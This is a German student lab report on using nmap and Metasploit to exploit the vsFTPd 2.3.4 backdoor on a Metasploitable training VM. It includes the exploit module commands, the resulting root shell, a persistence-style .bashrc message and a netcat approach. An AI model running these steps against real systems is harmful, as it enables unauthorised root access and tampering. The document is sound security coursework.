# Übung Metasploit – vsFTPd Backdoor

**Klasse:** 4 AHITS
**Name:** Martin Haberl
**Fach:** ITSE4 – Übungen
**Datum:** 03.11.2025

---

## 1) Ziel der Übung

Ziel dieser Übung ist es, mithilfe von **nmap** und dem **Metasploit Framework** eine bekannte Sicherheitslücke im FTP-Dienst **vsFTPd Version 2.3.4** auf der Metasploitable-VM zu identifizieren und auszunutzen. Dabei sollen grundlegende Metasploit-Befehle erlernt, Scanner-Module verwendet, ein Exploit ausgeführt und anschließend der erfolgreiche Zugriff verifiziert werden.

---

## 2) Grundlagen: Metasploit

Metasploit ist ein umfassender Werkzeugkasten für Penetration-Tester und Sicherheitsforscher. Mit Metasploit können unter anderem:

* Schwachstellen gesucht und analysiert werden
* Exploits ausgeführt werden
* Payloads erzeugt werden (z. B. mit msfvenom)
* Nach einem erfolgreichen Einbruch weitere Analysen durchgeführt werden (Meterpreter)

Start von Metasploit:

```sh
msfconsole
```

---

## 3) Metasploit Cheatsheet (Kurzfassung)

| Befehl                 | Beschreibung                     |
| ---------------------- | -------------------------------- |
| `help`                 | Hilfe anzeigen                   |
| `search <begriff>`     | Nach Modulen suchen              |
| `use <modul>`          | Modul aktivieren                 |
| `info`                 | Informationen zum Modul anzeigen |
| `options`              | Moduloptionen anzeigen           |
| `set <option> <wert>`  | Option setzen                    |
| `setg <option> <wert>` | Option global setzen             |
| `run` / `exploit`      | Modul ausführen                  |
| `back`                 | Modul verlassen                  |
| `exit`                 | Metasploit beenden               |

### setg (set global)

Der Befehl `setg` setzt Optionen global für alle Module. Dadurch muss z. B. die Ziel-IP nicht bei jedem Modul neu gesetzt werden.

Beispiel:

```sh
setg RHOSTS 192.168.5.51
```

---

## 4) Nmap Vulnerability Scan auf FTP

Der FTP-Dienst verwendet standardmäßig **TCP-Port 21**.

### Scan-Befehl:

```sh
nmap -p 21 --script=vuln 192.168.5.51
```

### Ergebnis:

Der Scan zeigt, dass der FTP-Dienst aktiv ist und eine bekannte Sicherheitslücke im Zusammenhang mit **vsFTPd 2.3.4** aufweist.

### Interpretation:

Die mit `--script=vuln` ausgeführten Skripte gelten als *intrusive*, da sie aktiv versuchen, Schwachstellen auszunutzen oder spezielle Anfragen an den Dienst zu senden. Aus diesem Grund werden diese Skripte nicht automatisch mit `-sC` oder `-A` ausgeführt.

---

## 5) FTP-Version mit Metasploit ermitteln

Zur Ermittlung der FTP-Version wird ein Scanner-Modul aus der Kategorie `auxiliary/scanner` verwendet.

### Modul:

```sh
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.5.51
run
```

### Ergebnis:

Das Modul identifiziert den laufenden FTP-Dienst als **vsFTPd Version 2.3.4**.

---

## 6) Ausnutzung der vsFTPd Backdoor mit Metasploit

### Voraussetzungen:

* Kali Linux und Metasploitable im **NAT-Modus**
* Metasploit gestartet (`msfconsole`)

### Exploit suchen:

```sh
search vsftpd
```

### Exploit auswählen:

```sh
use exploit/unix/ftp/vsftpd_234_backdoor
```

Nach der Aktivierung erscheint folgende Meldung:

```
[*] No payload configured, defaulting to cmd/unix/interact
```

### Optionen setzen und Exploit ausführen:

```sh
set RHOSTS 192.168.5.51
run
```

### Ergebnis:

Es wird eine Shell auf dem Zielsystem geöffnet. Diese Shell läuft direkt auf dem Metasploitable-System.

### Rechte der Shell:

Die Shell läuft mit **root-Rechten**, was eine vollständige Kompromittierung des Systems bedeutet.

---

## 7) Persistente Nachricht für den User msfadmin

Um beim nächsten Login eine Nachricht anzuzeigen, wird folgende Nachricht hinterlassen:

```sh
echo "you have been hacked!" >> /home/msfadmin/.bashrc
```

Beim nächsten Login des Benutzers `msfadmin` wird diese Nachricht automatisch angezeigt.

---

## 8) Supply-Chain-Attack: vsFTPd 2.3.4

Die Sicherheitslücke in **vsFTPd 2.3.4** gilt als klassische **Supply-Chain-Attack**, da nicht ein einzelnes Zielsystem angegriffen wurde, sondern die ausgelieferte Software selbst manipuliert war. Die offizielle Version enthielt eine absichtlich eingebaute Backdoor.

Ein aktuelles Beispiel für eine Supply-Chain-Attacke ist die **XZ-Backdoor (2024)**, bei der manipulierte Bibliotheken potenziell weitreichende SSH-Zugriffe ermöglicht hätten.

---

## 9) Exploit ohne Metasploit

Die vsFTPd-Backdoor kann auch ohne Metasploit ausgenutzt werden.

### Vorgehensweise:

* Recherche in der Exploit Database
* Analyse eines vorhandenen Python-Skripts
* Manuelles Nachstellen mit `nc` (netcat)

Beispiel:

```sh
nc 192.168.5.51 21
```

Durch das Senden eines speziell präparierten Login-Strings kann die Backdoor ausgelöst und eine Shell geöffnet werden.

---

## 10) Fazit

Die Übung zeigt eindrucksvoll, wie gefährlich veraltete und kompromittierte Software in einer Produktivumgebung sein kann. Bereits einfache Scans und ein öffentlich verfügbarer Exploit reichen aus, um vollständige Root-Rechte auf einem System zu erlangen. Die regelmäßige Aktualisierung von Software und die Überprüfung der Lieferkette sind daher essenziell für die IT-Sicherheit.
